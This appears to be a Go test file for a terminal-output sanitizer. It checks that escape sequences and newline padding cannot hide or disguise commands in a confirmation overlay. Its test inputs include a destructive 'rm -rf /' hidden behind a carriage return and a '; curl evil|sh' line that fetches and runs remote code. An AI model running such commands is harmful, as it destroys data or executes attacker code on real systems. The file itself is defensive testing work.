package security

import (
	"strings"
	"testing"
)

func TestSanitizeTerminalStripsEscapeSequences(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want string
	}{
		{"osc 52 clipboard write", "before\x1b]52;c;ZXZpbA==\x07after", "beforeafter"},
		{"osc terminated by st", "a\x1b]8;;http://evil\x1b\\b", "ab"},
		{"csi erase line", "a\x1b[2Kb", "ab"},
		{"csi color", "\x1b[31mred\x1b[0m", "red"},
		{"carriage return overwrite", "npm test\rrm -rf /", "npm testrm -rf /"},
		{"two char escape", "a\x1bcb", "ab"},
		{"dcs", "a\x1bPq;stuff\x1b\\b", "ab"},
		{"c1 introducer", "ab", "ab"},
		{"newline and tab kept", "a\n\tb", "a\n\tb"},
		{"plain text untouched", "hello world", "hello world"},
		{"unicode untouched", "héllo ✓ 日本", "héllo ✓ 日本"},
	}
	for _, c := range cases {
		if got := SanitizeTerminal(c.in); got != c.want {
			t.Errorf("%s: SanitizeTerminal(%q) = %q, want %q", c.name, c.in, got, c.want)
		}
	}
}

func TestSanitizeLineKeepsPayloadVisible(t *testing.T) {
	// Padding a command with blank lines used to push the real payload below
	// the fold of the confirmation overlay, which shows a bounded window.
	hidden := "npm test" + strings.Repeat("\n", 12) + "; curl evil|sh"
	got := SanitizeLine(hidden)
	if strings.Contains(got, "\n") {
		t.Fatalf("SanitizeLine left newlines: %q", got)
	}
	if !strings.Contains(got, "curl evil|sh") {
		t.Fatalf("SanitizeLine dropped the payload: %q", got)
	}
}
